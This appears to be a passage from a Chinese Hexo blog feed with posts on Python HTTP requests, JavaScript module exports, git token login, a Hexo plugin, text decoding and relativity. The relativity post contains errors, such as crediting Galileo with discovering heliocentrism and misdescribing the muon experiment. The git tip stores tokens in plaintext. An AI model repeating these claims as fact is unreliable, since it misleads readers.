class="hljs-string">&#x27;https://api.github.com/events&#x27;</span>)</span><span class="line">r = requests.post(<span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span>, data = &#123;<span class="hljs-string">&#x27;key&#x27;</span>:<span class="hljs-string">&#x27;value&#x27;</span>&#125;)</span><span class="line">r = requests.put(<span class="hljs-string">&#x27;http://httpbin.org/put&#x27;</span>, data = &#123;<span class="hljs-string">&#x27;key&#x27;</span>:<span class="hljs-string">&#x27;value&#x27;</span>&#125;)</span><span class="line">r = requests.delete(<span class="hljs-string">&#x27;http://httpbin.org/delete&#x27;</span>)</span><span class="line">r = requests.head(<span class="hljs-string">&#x27;http://httpbin.org/get&#x27;</span>)</span><span class="line">r = requests.options(<span class="hljs-string">&#x27;http://httpbin.org/get&#x27;</span>)</span></code></pre></div></div><h4 id="传递URL信息和响应信息"><a href="#传递URL信息和响应信息" class="headerlink" title="传递URL信息和响应信息"></a>传递URL信息和响应信息</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">payload = &#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;</span><span class="line">r = requests.get(<span class="hljs-string">&quot;http://httpbin.org/get&quot;</span>, params=payload)</span><span class="line"></br></span><span class="line"><span class="hljs-built_in">print</span>(r.url)</span><span class="line"><span class="hljs-comment"># http://httpbin.org/get?key2=value2&amp;key1=value1</span></span><span class="line"></br></span><span class="line">r.text  <span class="hljs-comment"># u解码后的</span></span><span class="line">r.content <span class="hljs-comment"># b未解码的</span></span><span class="line">r.encoding = <span class="hljs-string">&#x27;gbk2312&#x27;</span> <span class="hljs-comment"># 指定解码类型</span></span></code></pre></div></div><h4 id="定制请求头"><a href="#定制请求头" class="headerlink" title="定制请求头"></a>定制请求头</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">url = <span class="hljs-string">&#x27;https://api.github.com/some/endpoint&#x27;</span></span><span class="line">headers = &#123;<span class="hljs-string">&#x27;user-agent&#x27;</span>: <span class="hljs-string">&#x27;my-app/0.0.1&#x27;</span>&#125;</span><span class="line">cookies = <span class="hljs-built_in">dict</span>(cookies_are=<span class="hljs-string">&#x27;working&#x27;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line">r = requests.get(url, headers=headers, cookies=cookies)</span><span class="line"></br></span><span class="line">r.request.headers <span class="hljs-comment"># 查看请求头部</span></span><span class="line">r.headers  <span class="hljs-comment"># 查看响应头部</span></span></code></pre></div></div><h4 id="响应状态码"><a href="#响应状态码" class="headerlink" title="响应状态码"></a>响应状态码</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">r = requests.get(<span class="hljs-string">&#x27;http://httpbin.org/get&#x27;</span>)</span><span class="line">r.status_code</span><span class="line"><span class="hljs-comment"># 200</span></span><span class="line"></br></span><span class="line">r.status_code == requests.codes.ok</span><span class="line"><span class="hljs-comment"># True</span></span><span class="line"></br></span><span class="line">bad_r = requests.get(<span class="hljs-string">&#x27;http://httpbin.org/status/404&#x27;</span>)</span><span class="line">bad_r.status_code</span><span class="line"><span class="hljs-comment"># 404</span></span><span class="line">bad_r.raise_for_status() <span class="hljs-comment"># 错误将抛出异常，否则为None</span></span></code></pre></div></div><h4 id="重定向历史"><a href="#重定向历史" class="headerlink" title="重定向历史"></a>重定向历史</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">r = requests.get(<span class="hljs-string">&#x27;http://github.com&#x27;</span>)</span><span class="line">r.url</span><span class="line"><span class="hljs-comment"># &#x27;https://github.com/&#x27;</span></span><span class="line">r.status_code</span><span class="line"><span class="hljs-comment"># 200</span></span><span class="line">r.history</span><span class="line"><span class="hljs-comment"># [&lt;Response [301]&gt;]</span></span><span class="line"></br></span><span class="line">r = requests.get(<span class="hljs-string">&#x27;http://github.com&#x27;</span>, allow_redirects=<span class="hljs-literal">False</span>)</span><span class="line">r.status_code</span><span class="line"><span class="hljs-comment"># 301</span></span><span class="line">r.history</span><span class="line"><span class="hljs-comment"># []</span></span></code></pre></div></div><h3 id="urllib3-模块"><a href="#urllib3-模块" class="headerlink" title="urllib3 模块"></a>urllib3 模块</h3><p>POST 方法参考</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> urllib3 <span class="hljs-keyword">import</span> PoolManager</span><span class="line"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlencode, urljoin</span><span class="line"><span class="hljs-keyword">import</span> chardet</span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_chapters</span>()</span></span><span class="line marked"><span class="hljs-function">    <span class="hljs-title">http</span> = <span class="hljs-title">PoolManager</span>()</span></span><span class="line"></br></span><span class="line"><span class="hljs-function">    <span class="hljs-title">post_url</span> = &#x27;<span class="hljs-title">https</span>:</span>//info.support.huawei.com/network/ptmngsys/getTsrevList<span class="hljs-string">&#x27;</span></span><span class="line"><span class="hljs-string">    data = &#123;</span></span><span class="line"><span class="hljs-string">        &#x27;</span>lang<span class="hljs-string">&#x27;: &#x27;</span>CN<span class="hljs-string">&#x27;,</span></span><span class="line"><span class="hljs-string">        &#x27;</span>family<span class="hljs-string">&#x27;: family_str</span></span><span class="line"><span class="hljs-string">    &#125;</span></span><span class="line marked"><span class="hljs-string">    res = http.request(&#x27;</span>POST<span class="hljs-string">&#x27;, post_url, body=urlencode(data),</span></span><span class="line marked"><span class="hljs-string">                       headers=&#123;</span></span><span class="line marked"><span class="hljs-string">                           &#x27;</span>Cookie<span class="hljs-string">&#x27;: &#x27;</span>JSESSIONID=F5D938CEFxxxxxxxxxxxxx4559465B96; infosupport_network_ptmngsys_sticky=pro_dggpmw1tmc02615.huawei.com_8080:<span class="hljs-number">3</span>; hwsso_uniportal=<span class="hljs-string">&quot;&quot;</span>; hwsso_login=<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&#x27;,</span></span><span class="line marked"><span class="hljs-string">                           &#x27;</span>Host<span class="hljs-string">&#x27;: &#x27;</span>info.support.huawei.com<span class="hljs-string">&#x27;,</span></span><span class="line marked"><span class="hljs-string">                           &#x27;</span>Content-<span class="hljs-type">Type</span><span class="hljs-string">&#x27;: &#x27;</span>application/x-www-form-urlencoded; charset=UTF-<span class="hljs-number">8</span><span class="hljs-string">&#x27;</span></span><span class="line marked"><span class="hljs-string">    &#125;</span></span><span class="line marked"><span class="hljs-string">    )</span></span><span class="line"><span class="hljs-string">    if res.status != 200:</span></span><span class="line"><span class="hljs-string">        print(&quot;Can&#x27;</span>t <span class="hljs-built_in">open</span> web, check cookie value.<span class="hljs-string">&quot;)</span></span><span class="line"><span class="hljs-string">        return</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">    encode_type = chardet.detect(res.data)  # 自动判断编码类型</span></span><span class="line"><span class="hljs-string">    body = res.data.decode(encode_type[&#x27;encoding&#x27;])</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript 的export导出方式</title>
      <link href="/2021/07/15/js-module-export/"/>
      <url>/2021/07/15/js-module-export/</url>
      
        <content type="html"><![CDATA[<h2 id="javascript-的两种格式"><a href="#javascript-的两种格式" class="headerlink" title="javascript 的两种格式"></a>javascript 的两种格式</h2><p>javascript 中有两种格式模块</p><ol><li>Nodejs 的 <code>CommonJS</code>模块，简称<code>CJS</code></li><li>ES6模块，简称<code>ESM</code></li></ol><p>引入的方式区别如下：</p><p><img src="/2021/07/15/js-module-export/1.png"></p><p>CJS的导出都是<code>exports</code>，而<code>ESM</code>的导出都是<code>export</code></p><h2 id="CJS-的引入"><a href="#CJS-的引入" class="headerlink" title="CJS 的引入"></a>CJS 的引入</h2><p>使用两个文件来做测试，<code>utils.js</code> 和 <code>test.js</code></p><h3 id="module-exports"><a href="#module-exports" class="headerlink" title="module.exports"></a>module.exports</h3><div class="codeBlockContainer"><div class="codeBlockTitle">utils.js</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-keyword">const</span> a = <span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x + y;</span><span class="line"><span class="hljs-keyword">const</span> b = <span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x + y;</span><span class="line"><span class="hljs-built_in">module</span>.exports = a;</span><span class="line"><span class="hljs-built_in">module</span>.exports = b;</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockTitle">test.js</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-keyword">const</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./utils&#x27;</span>);</span><span class="line"><span class="hljs-built_in">console</span>.log(utils); <span class="hljs-comment">// [Function: b]</span></span></code></pre></div></div><p>可以看到，这种方法只能导出一个函数</p><h3 id="exports"><a href="#exports" class="headerlink" title="exports"></a>exports</h3><div class="codeBlockContainer"><div class="codeBlockTitle">utils.js</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-built_in">exports</span>.a = <span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x + y;</span><span class="line"><span class="hljs-built_in">exports</span>.b = <span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x - y;</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockTitle">test.js</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-keyword">const</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./utils&#x27;</span>);</span><span class="line"><span class="hljs-built_in">console</span>.log(utils); <span class="hljs-comment">//&#123; a: [Function (anonymous)], b: [Function (anonymous)] &#125;</span></span></code></pre></div></div><p>这种方法可以导出多个函数</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git push 免密执行</title>
      <link href="/2021/07/14/git-push-%E5%85%8D%E5%AF%86%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/07/14/git-push-%E5%85%8D%E5%AF%86%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>思路是使用github的token来进行登录</p><ul><li><a href="https://segmentfault.com/q/1010000000590947">参考这篇</a></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">git config --global credential.helper store</span></code></pre></div></div><p>然后在push的时候输入的密码为token值</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo highlight 插件编写</title>
      <link href="/2021/07/13/hexo-highlight-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99/"/>
      <url>/2021/07/13/hexo-highlight-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="插件编写思路"><a href="#插件编写思路" class="headerlink" title="插件编写思路"></a>插件编写思路</h2><p>首先要编写hexo的插件需要浏览<a href="https://hexo.io/zh-cn/api/">官方文档</a>。</p><p>编写插件的初衷是因为hexo的代码块有以下几点不足：</p><ol><li>对代码块标题的显示不够好</li><li>代码块的高亮只能是<code>&#123;% codeblock mark:2%&#125;</code>的写法才可以，并不是通用写法。</li><li>缺少代码中间添加<code>highlight-next-line</code>等注释可以高亮的功能</li><li>代码块的html结构不够清晰。</li></ol><p>基于此，我们要做的要么是直接修改源码要么就是添加一个插件。</p><h2 id="编写插件的准备工作"><a href="#编写插件的准备工作" class="headerlink" title="编写插件的准备工作"></a>编写插件的准备工作</h2><p>新创建一个<code>hexo</code>实例后，在<code>node_modules</code>文件夹下新建一个以<code>hexo-</code>开头的文件夹。我的为<code>hexo-highlight-mark</code>。<br>然后进入文件夹中执行<code>npm init</code>来初始化npm包，这里的问答可以直接一路回车，后面再在<code>package.json</code>中修改。</p><p>新建<code>index.js</code>文件作为入口文件。</p><p>在根目录中的<code>package.json</code>文件中添加插件的名称和版本号，此时插件就可以以最小单位运行了。</p><h2 id="如何修改代码块结构"><a href="#如何修改代码块结构" class="headerlink" title="如何修改代码块结构"></a>如何修改代码块结构</h2><p>这个插件要修改代码块的结构，可以用到<a href="https://hexo.io/zh-cn/api/filter">过滤器</a>。</p><div class="codeBlockContainer"><div class="codeBlockTitle">index.js</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-meta">&#x27;use strict&#x27;</span>;</span><span class="line"></br></span><span class="line">hexo.extend.filter.register(<span class="hljs-string">&#x27;before_post_render&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./lib/filter&#x27;</span>), <span class="hljs-number">8</span>);</span></code></pre></div></div><p><code>before_post_render</code>是过滤器在文章渲染之前就介入执行。</p><div class="codeBlockContainer"><div class="codeBlockTitle">./lib/filter.js</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-keyword">const</span> rBacktick = <span class="hljs-regexp">/^((?:[^\S\r\n]*&gt;)&#123;0,3&#125;[^\S\r\n]*)(`&#123;3,&#125;|~&#123;3,&#125;)[^\S\r\n]*((?:.*?[^`\s])?)[^\S\r\n]*\n((?:[\s\S]*?\n)?)(?:(?:[^\S\r\n]*&gt;)&#123;0,3&#125;[^\S\r\n]*)\2[^\S\r\n]?(\n+|$)/gm</span>;</span><span class="line"></br></span><span class="line"><span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) </span>&#123;</span><span class="line">    <span class="hljs-keyword">const</span> dataContent = data.content;</span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">if</span> ((!dataContent.includes(<span class="hljs-string">&#x27;```&#x27;</span>) &amp;&amp; !dataContent.includes(<span class="hljs-string">&#x27;~~~&#x27;</span>)) || (!hljsCfg.enable &amp;&amp; !prismCfg.enable)) <span class="hljs-keyword">return</span>;</span><span class="line"></br></span><span class="line marked">    data.content = dataContent.replace(rBacktick, <span class="hljs-function">(<span class="hljs-params">$<span class="hljs-number">0</span>, start, $<span class="hljs-number">2</span>, _args, _content, end</span>) =&gt;</span> &#123;</span><span class="line marked">        <span class="hljs-comment">// do something</span></span><span class="line marked">    &#125;</span><span class="line">&#125;</span></code></pre></div></div><p>上面的代码就是将<code>data.content</code>中的代码块部分进行匹配并且自定义渲染并返回替换原内容。</p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>配置调试文件如下：</p><div class="codeBlockContainer"><div class="codeBlockTitle">.vscode/launch.json</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-json codeBlockLines"><span class="line">&#123;</span><span class="line">    <span class="hljs-attr">&quot;version&quot;</span>: <span class="hljs-string">&quot;0.2.0&quot;</span>,</span><span class="line">    <span class="hljs-attr">&quot;configurations&quot;</span>: [</span><span class="line">        &#123;</span><span class="line">            <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;pwa-node&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Launch Program&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;program&quot;</span>: <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;\\node_modules\\hexo\\bin\\hexo&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;args&quot;</span>: [</span><span class="line">                <span class="hljs-string">&quot;g&quot;</span>,</span><span class="line">                <span class="hljs-string">&quot;--debug&quot;</span></span><span class="line">            ],</span><span class="line marked">            <span class="hljs-attr">&quot;preLaunchTask&quot;</span>: <span class="hljs-string">&quot;npm: clean&quot;</span></span><span class="line">        &#125;</span><span class="line">    ]</span><span class="line">&#125;</span></code></pre></div></div><p>配置前置任务，清除原有的数据</p><div class="codeBlockContainer"><div class="codeBlockTitle">.vscode/tasks.json</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-json codeBlockLines"><span class="line">&#123;</span><span class="line"><span class="hljs-attr">&quot;version&quot;</span>: <span class="hljs-string">&quot;2.0.0&quot;</span>,</span><span class="line"><span class="hljs-attr">&quot;tasks&quot;</span>: [</span><span class="line">&#123;</span><span class="line"><span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;npm&quot;</span>,</span><span class="line marked"><span class="hljs-attr">&quot;script&quot;</span>: <span class="hljs-string">&quot;clean&quot;</span>,  <span class="hljs-comment">// 名称必须相同，大小写敏感</span></span><span class="line"><span class="hljs-attr">&quot;problemMatcher&quot;</span>: [],</span><span class="line"><span class="hljs-attr">&quot;label&quot;</span>: <span class="hljs-string">&quot;npm: clean&quot;</span>,</span><span class="line"><span class="hljs-attr">&quot;detail&quot;</span>: <span class="hljs-string">&quot;hexo clean&quot;</span></span><span class="line">&#125;</span><span class="line">]</span><span class="line">&#125;</span></code></pre></div></div><h2 id="发布到npm"><a href="#发布到npm" class="headerlink" title="发布到npm"></a>发布到npm</h2><p>要发布npm，需要注册<a href="www.npmjs.com">npm账号</a></p><p>然后在插件文件夹修改好<code>package.json</code>然后运行登录和发布命令即可</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">npm login  <span class="hljs-comment"># 登录</span></span><span class="line">npm publish  <span class="hljs-comment"># 发布文件</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 前端技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 一劳永逸的 decode 字符串转换方法</title>
      <link href="/2021/07/12/python-%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2/"/>
      <url>/2021/07/12/python-%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="自动检测字符串类型并进行decode"><a href="#自动检测字符串类型并进行decode" class="headerlink" title="自动检测字符串类型并进行decode"></a>自动检测字符串类型并进行decode</h2><ul><li><a href="https://blog.csdn.net/jieli_/article/details/70166244">看这篇文章</a></li></ul><p>当不清楚字符串是什么类型的时候，比如html，此时可以使用<code>chardet</code>模块来进行识别</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> chardet   <span class="hljs-comment">#需要导入这个模块，检测编码格式</span></span><span class="line">encode_type = chardet.detect(html)  </span><span class="line">html = html.decode(encode_type[<span class="hljs-string">&#x27;encoding&#x27;</span>]) <span class="hljs-comment">#进行相应解码，赋给原标识符（变量）</span></span><span class="line">从<span class="hljs-built_in">str</span>到<span class="hljs-built_in">bytes</span>:调用方法encode().</span><span class="line">编码是把Unicode字符串以各种方式编码成为机器能读懂的ASCII字符串</span><span class="line">从<span class="hljs-built_in">bytes</span>到<span class="hljs-built_in">str</span>:调用方法decode().</span></code></pre></div></div><h2 id="UnicodeDecodeError"><a href="#UnicodeDecodeError" class="headerlink" title="UnicodeDecodeError"></a>UnicodeDecodeError</h2><p>当出现<code>UnicodeDecodeError: &#39;gbk&#39; codec can&#39;t decode byte ...</code>，原因是文档中的特殊符号超过了gbk的字符集。</p><p>所以要么使用更广的<code>gb18030</code>要么忽略:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line"><span class="hljs-keyword">open</span>(<span class="hljs-type">path</span>, encoding=<span class="hljs-string">&#x27;gb18030&#x27;</span>)   # 更广的字符集</span><span class="line"><span class="hljs-keyword">open</span>(<span class="hljs-type">path</span>, encoding=<span class="hljs-string">&#x27;gb18030&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)   # 更广的字符集，并且错误的忽略</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> decode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>相对论</title>
      <link href="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/"/>
      <url>/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="相对论的简单信念"><a href="#相对论的简单信念" class="headerlink" title="相对论的简单信念"></a>相对论的简单信念</h2><p>首先我们来讲一讲现代物理学的开始。<br>故事要从伽利略发现日心说开始，那时候的人都相信所有的星星都是绕着地球做运动的。但是伽利略看破了红尘，他明白了地球和其他行星都是绕着太阳做运动。而且并没有什么精灵在推着行星做运动，只需要太阳施加一个吸引力就可以。<br>第二个人是牛顿。<br>牛顿的第一定律描述了，在没有外力的作用下，物体会保持静止或者匀速直线运动。 匀速直线运动和静止一样无需外力。<br>牛顿的第二定律描述了，力会改变物体的运动方式。 请注意，这里说的是，力，是<strong>改变</strong>运动的原因。而不是力是运动的原因。<br>牛顿看破了红尘，在他的眼里，运动和静止是一回事。</p><p>第三个人是爱因斯坦。<br>看到了我们是相对于不同坐标系下来讨论这些问题的，这火车上，你射箭。相对于火车这个坐标系，你看到的是射箭的速度。 而相对于地面这个坐标系，那射箭的速度就是火车的速度加上射箭的速度。<br>可能有人会说，这不就是哲学上的参考不同的坐标系嘛，我们哲学家喝茶的功夫早就知道了。 但是爱因斯坦发现了让哲学家喝多少茶都想不到的事情。<br>当你在火车上打手电筒，手电筒的光的速度会不会是相对于地面的坐标系是光速加上火车的速度呢？<br>答案是不会，无论你从哪里去观察，光速都是一定的。天上和地下是一样的，我们这里和外星人那里也是一样的。<br>这是爱因斯坦的洞见，也是相对论和基础。</p><h2 id="电磁场英雄壮举"><a href="#电磁场英雄壮举" class="headerlink" title="电磁场英雄壮举"></a>电磁场英雄壮举</h2><p>英国物理学家詹姆斯。克拉克。麦克斯韦统一了电磁学。</p><p>当时的物理学好像有点杂乱无章，这时候麦克斯韦学众家之长，然后发现了电磁学。</p><p>首先我们弄清楚：<br>什么是电？电是电荷之间的相互作用。电子带负电，离子带正电。电子和离子产生吸引力。<br>什么是磁呢？ 磁来源于电，是电荷的运动产生了磁。 电流周围就会有磁。</p><p>什么是场？ 电荷与电荷之间没有什么<em>超距作用</em>，是电荷周会有场，电荷通过场来相互作用。<br>什么是电磁场？ 是电场和磁场相互叠加的一个总描述，叫做电磁场。</p><p>电可以生磁？变化的磁场产生电场， 反过来，变化的电场产生磁场。<strong>其中不需要电荷的存在</strong>。<br>这时，麦克斯韦想到，如果我用一个振荡器来产生周期变化的磁场，那么周期变化的磁场，就会产生电场。而周期变化的电场又会产生新的磁场，这么这样就可以一直传播下去。这就是<strong>电磁波</strong>。</p><p>电和磁的有规律的相互转化，产生了电磁波。<br>根据测量，电磁波的传播速度和光速一致。<br>麦克斯韦宣布，<strong>光其实就是电磁波</strong>。</p><blockquote><p>这是物理学家再一次看破了红尘。天上的东西和地上是一回事，匀速直线运动和静止是一回事，电和磁是一回事，而现在麦克斯韦说，光跟电磁场，其实也是一回事。</p></blockquote><p>但是，这里有一个问题，这个电磁波是根据什么坐标系来观测的？ 是发送电磁波的仪器吗？ 但是天文学家发现，双星系统，其中一个靠近我们，那另一个就是远离我们的情况下，观测到的两个行星的电磁波的速度其实是一样的。</p><p>当时的人们认为空间中存在<em>以太</em>这种物质来传播，但是被证明不存在。</p><p>此时爱因斯坦登场</p><blockquote><p>一般情况下师长们都告诉你要适应世界。爱因斯坦不是来适应世界的，他是来改变世界的。</p></blockquote><h2 id="刺激1905"><a href="#刺激1905" class="headerlink" title="刺激1905"></a>刺激1905</h2><p>这一年称为奇迹年，爱因斯坦发表了数篇论文，引发了人类关于物理世界的基本概念 – 时间、空间、能量、光和物质 – 的三大革命。</p><p>首先，爱因斯坦断言：</p><blockquote><p><strong>一切静止或者匀速直线运动的坐标系下，物理定律都一样。</strong></p></blockquote><p>这表明了不只有力在坐标系下都一样，而是所有物理定律 – 包括电动力学 – 都一样。</p><p>并且断言，<strong>光速无论是什么坐标系下，都一样。</strong><br>$$ c = 299,792,458 m/s $$</p><p>你所感觉的光速在火车上还是地上的速度问题，并不是光速的问题，而是你的时空观有问题。</p><p>现在假设你在火车上向天花板照一束光，是向下面这样的。</p><p><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/relativity_1.jpg" alt="Alt text| center | 200*0"></p><p>而在地面上的人看到的结果是这样的：</p><p><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/relativity_2.jpg" alt="Alt text | center | 500*0"></p><p>可以看出来，在地面坐标系种，光走的是斜线。<br>距离D比L要长，光速不变，所以时间更长。</p><p>结论是，在火车上你感觉到的时间要比在外面的时间短。<br><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/relativity_3.png" alt="Alt text | left | 300*0"></p><p>$ v \uparrow \rightarrow \Delta t’ \uparrow$</p><p>速度越快， $\Delta t’ \uparrow $ 就越大在外面感受到的时间就越快。相对的，$\Delta t \downarrow$ 就越小，里面的人感受到的时间就越慢。<br>所以在地面坐标系下看，地上的人感受到的时间没有变化，而火车里的人的时间变慢了。<strong>是时间本身变慢了</strong></p><h2 id="穿越到未来"><a href="#穿越到未来" class="headerlink" title="穿越到未来"></a>穿越到未来</h2><ul><li>这部分可以参考<a href="https://b23.tv/l72627Q">可视化解释</a></li></ul><h3 id="真的可以长寿"><a href="#真的可以长寿" class="headerlink" title="真的可以长寿"></a>真的可以长寿</h3><p>相对论的核心在于处于不用的坐标系来观察。</p><p>我们可以做这样的一个实验。<br>有一个星球距离我们80光年，我们通过加速到0.8c的宇宙飞船飞到那个星球。<br>在地面上的人看，这段时间需要花上100年。 而飞船上的宇航员自己则会感觉到只过去了60年。坐标系下的时间会发生<strong>时间膨胀</strong>。<br>要用这个方法来验证显然不太现实。但是物理学家想到了另外一种实验方法。</p><p>有一种叫做$\mu$子的基本粒子，他有一基本特性就是特别特别短命。 半衰期是2.2微秒。也就是说给你一堆$\mu$子，他们会在2.2微秒后只剩下一半了，然后再过2.2微秒又有一半木有了。<br>而这个实验就是将一堆$\mu$子从山顶上加速到0.9994c的光速，然后丢下来。如果到地面上的$\mu$子数量大于在静止坐标系下得到的数量，那么相对论就是正确的。</p><p>实验结果完美的符合了相对论的预测，平均寿命被延长了29.3倍！</p><p>相对论不但正确，而且非常精确。</p><h3 id="双生子佯谬"><a href="#双生子佯谬" class="headerlink" title="双生子佯谬"></a>双生子佯谬</h3><p>问题是这样的，你妹妹在地球上，而你坐上了宇宙飞船。<br>在妹妹的坐标系中，你处于高速运动中，你的时间变慢了。<br>而在你的坐标系中，妹妹同样也是高速离开，那妹妹的时间也变慢了。</p><p class='quest'>那你飞一圈回来后，是你比妹妹年轻还是妹妹比你年轻呢？<p class='answer'>这个问题的关键在于你的坐标系和你妹妹的坐标系并不是等价的。<p>你所处于的运动过程，要有加速，匀速直线减速掉头再加速最后减速的过程。并不全都是匀速直线运动。<br>计算的过程比较复杂，但是结论是真实的。并且你会比你妹妹年轻一些。</p><h3 id="时空是相对的"><a href="#时空是相对的" class="headerlink" title="时空是相对的"></a>时空是相对的</h3><p>和<strong>时间膨胀</strong>对应的是<strong>长度收缩</strong></p><p>当宇航员用20年的时间完成了本来需要30年才能完成的路程。那么相对于宇航员来看。这段路程实际上是变短了。</p><p>我们所处的坐标系下，其实和外星人所处的坐标系。在没有联系的情况下是完全两个独立的时空。你过你的，我过我的。但是一旦建立起了联系，那么就需要进行相对的转换了。</p><h2 id="“现在”是一个幻觉"><a href="#“现在”是一个幻觉" class="headerlink" title="“现在”是一个幻觉"></a>“现在”是一个幻觉</h2><h3 id="同时不同时"><a href="#同时不同时" class="headerlink" title="同时不同时"></a>同时不同时</h3><p>首先我们想象一个运动火车中中间的一盏灯，发出了一束光。<br>当你站在火车中的时候，这两束光是同时到达了火车头和火车尾部。<br><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/relativity_5.jpg" alt="Alt text | center | 400*0"></p><p>而当你站在外面观察这盏灯发出来的光线。火车从左到右，那么这两束光线是先到达了车尾，后到达了车头。<br><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/relativity_4.jpg" alt="Alt text | center | 400*0"></p><p>两个情况是不相同的。 同时还是不同时完全取决于你的坐标系。<br><strong>抛开坐标系谈相关性都是空谈。</strong></p><h3 id="光锥中的才是命运"><a href="#光锥中的才是命运" class="headerlink" title="光锥中的才是命运"></a>光锥中的才是命运</h3><p>事实上，我们身边发生的事情都不是同时发生的。<br><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/relativity_6.jpg" alt="Alt text | center | 